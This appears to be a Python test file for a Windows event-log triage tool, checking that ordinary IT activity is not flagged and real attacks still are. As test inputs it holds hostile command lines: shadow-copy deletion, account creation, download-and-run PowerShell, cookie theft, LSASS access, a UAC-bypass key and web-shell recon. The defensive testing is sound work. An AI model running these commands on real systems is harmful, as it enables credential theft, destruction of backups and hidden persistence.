"""Milestone 5: normal IT activity must not be Malicious, and real attacks still are.
Every name here is made up (agent.exe, PC01, analyst, example domains)."""

from tests.fixtures.events import USER, attack_events, event
from triage.checks import make_verdict, run_checks

SYS = "C:\\Windows\\System32\\"
PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
AGENT = "C:\\Program Files\\Example RMM\\agent.exe"


def checks_fired(events):
    return {f["check"] for f in run_checks(events)}


def strengths(events, check):
    return [f["strength"] for f in run_checks(events) if f["check"] == check]


# ---------- 1a: recon ----------

# ---------- 1b: lookalike ----------

def test_brand_owned_domain_is_not_a_lookalike():
    teams = USER + "\\AppData\\Local\\Microsoft\\Teams\\ms-teams.exe"
    events = [event(1, 22, "2026-02-01 09:00:00.000", Image=teams, QueryName="teams.cloud.microsoft"),
              event(2, 22, "2026-02-01 09:00:01.000", Image=teams, QueryName="cloud.microsoft")]
    assert run_checks(events) == []


# ---------- 1c: services ----------

def service(path, record=1):
    """A file is created during the log, then a service is set to run it."""
    return [event(record, 11, "2026-02-01 09:00:00.000", ProcessGuid="{i}", Image=SYS + "msiexec.exe",
                  TargetFilename=path),
            event(record + 1, 13, "2026-02-01 09:00:01.000", ProcessGuid="{svc}", Image=SYS + "services.exe",
                  TargetObject="HKLM\\System\\CurrentControlSet\\Services\\Example\\ImagePath", Details=path)]


def test_defender_platform_and_driver_store_services_are_not_findings():
    defender = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.1-0\\MsMpEng.exe"
    driver = SYS + "DriverStore\\FileRepository\\example.inf_amd64_1\\exampleservice.exe"
    assert "persistence" not in checks_fired(service(defender))
    assert "persistence" not in checks_fired(service(driver))


def test_fake_updater_service_is_still_strong():
    assert [f["strength"] for f in run_checks(attack_events())
            if f["title"] == "New service from a dropped file"] == ["Strong"]


# ---------- 1d: LSASS ----------

def test_lsass_reader_in_windows_temp_is_strong():
    fake = "C:\\Windows\\Temp\\wininit.exe"
    events = [event(1, 10, "2026-02-01 09:00:00.000", SourceImage=fake, SourceProcessGUID="{f}",
                    TargetImage=SYS + "lsass.exe", GrantedAccess="0x1fffff")]
    assert strengths(events, "lsass_access") == ["Strong"]


# ---------- 5d: document apps ----------

def test_outlook_opening_a_browser_or_open_with_is_not_a_finding():
    outlook = "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
    chrome = USER + "\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{c}", Image=chrome, ParentImage=outlook,
                    CommandLine=f'"{chrome}" https://www.example.com/'),
              event(2, 1, "2026-02-01 09:00:01.000", ProcessGuid="{r}", Image=SYS + "rundll32.exe",
                    ParentImage=outlook, CommandLine="rundll32.exe shell32.dll,OpenAs_RunDLL C:\\x\\a.dat")]
    assert "document_app_spawns_program" not in checks_fired(events)
    events.append(event(3, 1, "2026-02-01 09:00:02.000", ProcessGuid="{p}", Image=PS, ParentImage=outlook,
                        CommandLine="powershell -c whoami"))
    assert "document_app_spawns_program" in checks_fired(events)


# ---------- 5c: cookies ----------

def test_deleting_cookies_is_not_theft_but_copying_them_is():
    cookies = USER + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    delete = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{d}", Image=SYS + "cmd.exe",
                    CommandLine=f'cmd /c del /f "{cookies}"')]
    copy = [event(2, 1, "2026-02-01 09:00:00.000", ProcessGuid="{c}", Image=SYS + "cmd.exe",
                  CommandLine=f'cmd /c copy "{cookies}" C:\\Users\\Public\\c.db')]
    assert "credential_theft" not in checks_fired(delete)
    assert strengths(copy, "credential_theft") == ["Strong"]


# ---------- Block 2: privacy ----------

# ---------- Block 3: encoding does not hide a command from the rule lists ----------

def encoded(script):
    import base64
    return "powershell -NoProfile -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()


def test_encoded_shadow_copy_deletion_is_strong():
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS,
                    CommandLine=encoded("vssadmin delete shadows /all /quiet"))]
    findings = [f for f in run_checks(events) if f["check"] == "evidence_removal"]
    assert [f["strength"] for f in findings] == ["Strong"]
    assert "decoded command: vssadmin delete shadows" in findings[0]["detail"]


def test_encoded_new_account_is_found_with_the_password_hidden():
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS,
                    CommandLine=encoded("net user bob Winter2026! /add"))]
    findings = run_checks(events)
    assert [f["check"] for f in findings] == ["access_change"]
    assert "Winter2026!" not in findings[0]["detail"]


# ---------- Block 4: the page never crashes ----------

# ---------- Block 5: accuracy ----------

def ps_strength(script):
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS, ParentProcessGuid="{d}",
                    ParentImage=USER + "\\Downloads\\helper.exe", CommandLine="powershell -c " + script)]
    return strengths(events, "suspicious_powershell")


def test_powershell_curl_and_wget_count_as_downloads():
    assert ps_strength("curl https://x.example/a.txt -OutFile a.txt") == ["Weak"]
    assert ps_strength("iex (wget https://x.example/a.ps1).Content") == ["Strong"]


def test_official_package_manager_installers_are_low():
    choco = ("iex ((New-Object System.Net.WebClient).DownloadString("
             "'https://community.chocolatey.org/install.ps1'))")
    assert ps_strength(choco) == ["Weak"]
    assert ps_strength("irm get.scoop.sh | iex") == ["Weak"]
    assert ps_strength("irm https://scoop.example.net/x | iex") == ["Strong"]   # any other source


def test_uac_bypass_key_in_the_classes_form_is_strong():
    events = [event(1, 13, "2026-02-01 09:00:00.000", ProcessGuid="{u}", Image=USER + "\\Downloads\\u.exe",
                    TargetObject="HKU\\S-1-5-21-0_Classes\\ms-settings\\shell\\open\\command\\(Default)",
                    Details="C:\\Users\\Public\\u.exe")]
    assert strengths(events, "uac_bypass") == ["Strong"]


def test_ransom_note_names_and_paths_with_spaces():
    def opened(command):
        return [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{n}", Image=SYS + "notepad.exe",
                      ParentImage=USER + "\\Downloads\\x.exe", CommandLine=command)]
    assert "ransom_note" in checks_fired(opened("notepad.exe C:\\Users\\Public\\RESTORE_MY_FILES.txt"))
    assert "ransom_note" in checks_fired(opened("notepad.exe C:\\Users\\a\\Desktop\\HOW TO RECOVER.txt"))
    assert "ransom_note" not in checks_fired(opened("notepad.exe C:\\Program Files\\App\\readme.txt"))


# ---------- new Low checks (policy: unsure = Suspicious) ----------

def test_script_host_going_online_is_low():
    def connect(image, ip, initiated="true"):
        return [event(1, 3, "2026-02-01 09:00:00.000", ProcessGuid="{s}", Image=image,
                      DestinationIp=ip, DestinationPort="443", Initiated=initiated)]
    assert strengths(connect(PS, "93.184.216.34"), "script_host_online") == ["Weak"]
    assert strengths(connect(SYS + "mshta.exe", "93.184.216.34"), "script_host_online") == ["Weak"]
    assert "script_host_online" not in checks_fired(connect(PS, "10.0.0.5"))                 # private
    assert "script_host_online" not in checks_fired(connect(PS, "93.184.216.34", "false"))   # incoming
    assert "script_host_online" not in checks_fired(connect(SYS + "svchost.exe", "93.184.216.34"))


def test_remote_access_tool_is_low_once_per_tool():
    tool = "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe"
    events = [event(n, 1, "2026-02-01 09:00:0%d.000" % n, ProcessGuid="{a%d}" % n, Image=tool) for n in (1, 2)]
    assert strengths(events, "remote_access_tool") == ["Weak"]
    assert "remote_access_tool" not in checks_fired([event(1, 1, "2026-02-01 09:00:00.000", Image=SYS + "mstsc.exe")])


def run_key(writer, value):
    return [event(1, 13, "2026-02-01 09:00:00.000", ProcessGuid="{w}", Image=writer,
                  TargetObject="HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Example",
                  Details=value)]


def test_any_new_run_key_is_low_except_an_app_adding_itself():
    app = "C:\\Program Files\\Example\\tray.exe"
    assert "persistence" not in checks_fired(run_key(app, f'"{app}" --minimized'))           # adds itself
    assert strengths(run_key(app, '"C:\\Program Files\\Other\\other.exe"'), "persistence") == ["Weak"]
    assert strengths(run_key(SYS + "reg.exe", "powershell -w hidden -c iex $x"), "persistence") == ["Weak"]


def service_set(value):
    return [event(1, 13, "2026-02-01 09:00:00.000", ProcessGuid="{svc}", Image=SYS + "services.exe",
                  TargetObject="HKLM\\System\\CurrentControlSet\\Services\\Example\\ImagePath", Details=value)]


def test_any_new_service_outside_windows_is_low():
    assert strengths(service_set('"C:\\Program Files\\Example\\svc.exe"'), "persistence") == ["Weak"]
    assert strengths(service_set("%COMSPEC% /b /c start c:\\x.exe"), "persistence") == ["Weak"]
    assert strengths(service_set("C:\\Windows\\System32\\cmd.exe /c x"), "persistence") == ["Weak"]
    # Windows' own services, in any of the short forms Windows writes: no finding.
    for windows in ("%SystemRoot%\\System32\\svchost.exe -k netsvcs", "\\SystemRoot\\System32\\drivers\\x.sys",
                    "System32\\drivers\\y.sys", "C:\\Windows\\System32\\spoolsv.exe"):
        assert "persistence" not in checks_fired(service_set(windows))


# ---------- web shell and data theft ----------

W3WP = SYS + "inetsrv\\w3wp.exe"


def test_web_server_starting_a_shell_is_strong_and_backs_up_its_recon():
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{w3}", Image=W3WP),
              event(2, 1, "2026-02-01 09:00:01.000", ProcessGuid="{c}", ParentProcessGuid="{w3}",
                    Image=SYS + "cmd.exe", ParentImage=W3WP, CommandLine="cmd /c whoami & ipconfig"),
              event(3, 1, "2026-02-01 09:00:01.100", ProcessGuid="{w}", ParentProcessGuid="{c}",
                    Image=SYS + "whoami.exe", ParentImage=SYS + "cmd.exe"),
              event(4, 1, "2026-02-01 09:00:01.200", ProcessGuid="{i}", ParentProcessGuid="{c}",
                    Image=SYS + "ipconfig.exe", ParentImage=SYS + "cmd.exe")]
    assert strengths(events, "web_shell") == ["Strong"]
    assert strengths(events, "recon_burst") == ["Strong"]          # backed up by the web shell
    # A web server starting its own helper (not a shell) is normal.
    helper = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{h}", Image="C:\\php\\php-cgi.exe",
                    ParentImage=W3WP)]
    assert "web_shell" not in checks_fired(helper)


def archive_run(command):
    return [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{z}", Image="C:\\Program Files\\7-Zip\\7z.exe",
                  CommandLine=command)]


def test_archive_is_low_and_a_disguised_archive_is_strong():
    assert strengths(archive_run('7z.exe a -pSecret1 "C:\\Users\\Public\\out.7z" C:\\docs'), "archive") == ["Weak"]
    assert strengths(archive_run("7z a backup C:\\docs"), "archive") == ["Weak"]          # 7-Zip adds .7z
    assert strengths(archive_run("tar -czf out.tgz docs"), "archive") == ["Weak"]
    assert strengths(archive_run("7z a -tzip C:\\Users\\Public\\holiday.jpg C:\\docs"), "archive") == ["Strong"]
    assert "archive" not in checks_fired(archive_run("7z x C:\\Downloads\\setup.zip"))   # unpacking
    assert "archive" not in checks_fired(archive_run("tar -xf a.tar -C out"))


def files_on(drive, count, ending=".docx"):
    return [event(n, 11, "2026-02-01 09:%02d:%02d.000" % (n // 60, n % 60), ProcessGuid="{x}",
                  Image="C:\\Windows\\explorer.exe", TargetFilename=f"{drive}:\\copy\\file{n}{ending}")
            for n in range(1, count + 1)]


def test_bulk_copy_or_archive_to_another_drive_is_low():
    assert strengths(files_on("E", 20), "copy_to_other_drive") == ["Weak"]
    assert "copy_to_other_drive" not in checks_fired(files_on("E", 19))      # a few files: normal
    assert "copy_to_other_drive" not in checks_fired(files_on("C", 50))      # the system drive
    assert strengths(files_on("F", 1, ending=".7z"), "copy_to_other_drive") == ["Weak"]


def test_transfer_sites_and_upload_tools_are_low():
    edge = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
    lookups = [event(1, 22, "2026-02-01 09:00:00.000", Image=edge, QueryName="eu.gofile.io"),
               event(2, 22, "2026-02-01 09:00:01.000", Image=edge, QueryName="www.dropbox.com")]
    assert strengths(lookups, "cloud_upload") == ["Weak"]                   # gofile only
    tool = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{r}", Image="C:\\Users\\Public\\rclone.exe",
                  CommandLine="rclone copy C:\\docs remote:backup")]
    assert strengths(tool, "cloud_upload") == ["Weak"]


